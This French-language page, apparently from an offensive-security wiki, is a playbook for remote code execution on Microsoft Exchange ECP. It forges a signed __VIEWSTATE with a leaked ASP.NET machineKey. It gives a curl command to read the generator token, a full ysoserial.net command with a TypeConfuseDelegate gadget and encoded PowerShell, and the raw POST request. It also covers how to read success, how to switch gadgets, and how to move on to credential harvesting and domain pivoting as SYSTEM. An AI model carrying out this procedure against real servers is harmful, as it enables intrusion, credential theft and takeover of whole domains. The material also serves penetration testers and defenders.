---
order: 4
title: "Désérialisation ViewState : forger __VIEWSTATE avec une machineKey divulguée"
description: "Atteindre l'exécution de code sur l'ECP Exchange en forgeant un blob __VIEWSTATE signé avec une machineKey ASP.NET statique ou divulguée (validationKey et decryptionKey issus de web.config), de sorte que le pool d'applications ECP désérialise des objets .NET contrôlés par l'attaquant via BinaryFormatter et exécute du code sous l'identité Exchange. Utilise ysoserial.net pour construire la charge."
keywords:
  - désérialisation ViewState
  - machineKey
  - validationKey
  - ysoserial.net
  - ECP
---

# Désérialisation ViewState

Les pages ASP.NET font transiter l'état de la page dans un champ caché `__VIEWSTATE`, protégé par la **`machineKey`** de l'application (une `validationKey` et une `decryptionKey` dans `web.config`). Le serveur fait confiance à tout `__VIEWSTATE` qui porte une signature valide sous ces clés, et le désérialise avec `BinaryFormatter` avant l'exécution de la page. L'application ECP (`/ecp/default.aspx`) est une application ASP.NET comme une autre. Si vous connaissez sa `machineKey`, vous forgez un `__VIEWSTATE` qui se désérialise en une chaîne de gadgets exécutant une commande, le signez avec les clés, et le POSTez : le pool d'applications ECP le désérialise et exécute votre commande sous l'identité Exchange, typiquement `SYSTEM`. Ceci est indépendant de la build ; cela dépend entièrement de l'**exposition des clés**, non d'un proxy non corrigé.

## Prérequis

- La `machineKey` de l'ECP (`validationKey`, `decryptionKey` et les algorithmes). Elle provient d'une clé statique livrée dans une build vulnérable, d'une clé divulguée par un autre bug (une lecture SSRF de `web.config`, ou une lecture de fichier du back end de type ProxyLogon), ou d'une récupération depuis un point d'appui.
- Un `/ecp/` accessible et une valeur `__VIEWSTATEGENERATOR` valide pour la page cible (elle est statique par page et visible dans le HTML de la page, ou une valeur par défaut connue).
- Le `__VIEWSTATEGENERATOR` et les clés doivent correspondre à la page cible pour que la signature soit validée.

## Étape 1 : confirmer la page et le générateur

Récupérez la page ECP et lisez le jeton de générateur qui fixe le ViewState à cette page :

```bash
curl -sk 'https://mail.example.com/ecp/default.aspx' | grep -oE '__VIEWSTATEGENERATOR" value="[0-9A-F]+"'
# -> __VIEWSTATEGENERATOR" value="B97B4E27"
```

Une valeur de générateur renvoyée confirme que la page sert du ViewState et fournit le jeton pour lequel signer. Si l'ECP requiert une session avant d'atteindre `default.aspx`, associez cela à un cookie ECP valide ou à une SSRF qui atteint la page.

## Étape 2 : forger la charge ViewState signée

`ysoserial.net` construit un `__VIEWSTATE` pour un gadget choisi (`TypeConfuseDelegate` est le plus courant), le signe avec les clés divulguées, et le lie au chemin de la page et au générateur pour que la signature soit validée côté serveur :

```bash
# Build a signed ViewState that runs a command when deserialized
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -enc <base64 payload>" \
  --path="/ecp/default.aspx" \
  --apppath="/ecp" \
  --generator="B97B4E27" \
  --validationkey="<leaked-validationKey>" \
  --validationalg="SHA1" \
  --decryptionkey="<leaked-decryptionKey>" \
  --decryptionalg="AES"
# outputs a long URL-encoded __VIEWSTATE string
```

La sortie est la valeur `__VIEWSTATE` encodée en URL. `--path` et `--apppath` doivent correspondre exactement à l'URL de la requête, et `--generator` doit correspondre à l'étape 1, sinon le serveur rejette la signature avant la désérialisation.

## Étape 3 : le POSTer à la page

Envoyez le ViewState forgé à la même page et au même générateur. Le serveur valide la signature (elle passe, car vous avez signé avec les vraies clés), puis désérialise et exécute le gadget :

```http
POST /ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=<forged-urlencoded-viewstate> HTTP/1.1
Host: mail.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

Interprétez le résultat : une erreur ViewState `500` qui n'est **pas** un échec de validation du MAC signifie généralement que le gadget s'est exécuté et que la page a ensuite planté sur l'état corrompu, ce qui est la signature de succès attendue ; vérifiez par l'effet de bord (un callback, un fichier écrit, la sortie de `whoami` dans un emplacement préparé). Un `500` indiquant « validation of viewstate MAC failed » signifie que les clés, le chemin ou le générateur ne correspondent pas, donc revérifiez les trois.

## Variantes et suite

- La même technique s'applique à tout chemin ASP.NET d'Exchange qui fait transiter du ViewState dès lors que vous détenez sa `machineKey` ; l'ECP `default.aspx` est le plus fiable.
- Le choix du gadget peut être changé (`TypeConfuseDelegate`, `ActivitySurrogateSelector`) quand l'un est bloqué par le binder de désérialisation du serveur.
- Le code s'exécute sous l'identité du pool d'applications ECP, généralement `SYSTEM` ; la suite est exactement celle de tout Exchange `SYSTEM`, récupérer les identifiants et pivoter vers le domaine grâce aux droits AD d'Exchange (voir la [vue d'ensemble des chaînes RCE](index.md) et [PrivExchange](../privexchange.md)).

## Notes d'exploitation

- Toute la technique repose sur l'exposition des clés : une clé statique dans une build vulnérable, ou une clé lue via une SSRF/lecture de fichier chaînée, donc c'est le second stade naturel après une lecture de fichier du back end par [ProxyLogon](proxylogon.md) qui divulgue `web.config`.
- Les trois valeurs de liaison (`path`, `apppath`, `generator`) plus les clés doivent toutes correspondre ; un `500` d'échec du MAC est la signature qui ne valide pas, pas le gadget qui échoue.
- C'est indépendant de la build, donc cela peut réussir sur un serveur corrigé contre les chaînes de proxy, tant que la `machineKey` est connue.

## Outils

- **ysoserial.net** (`-p ViewState`) : forger et signer la charge `__VIEWSTATE`.
- **curl / Burp** : POSTer le ViewState forgé et lire la signature de la réponse.
- **Metasploit** (modules de type `exchange_ecp_viewstate`) : wrappers maintenus lorsque les clés sont connues.

## Références

- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [Soroush Dalili / NCC: ASP.NET ViewState deserialization](https://www.nccgroup.com/us/research-blog/reliable-net-remoting-and-viewstate-deserialization/)
- [ZDI: exploiting Exchange PowerShell and ECP primitives](https://www.thezdi.com/blog/2024/9/11/exploiting-exchange-powershell-after-proxynotshell-part-2-approvedapplicationcollection)
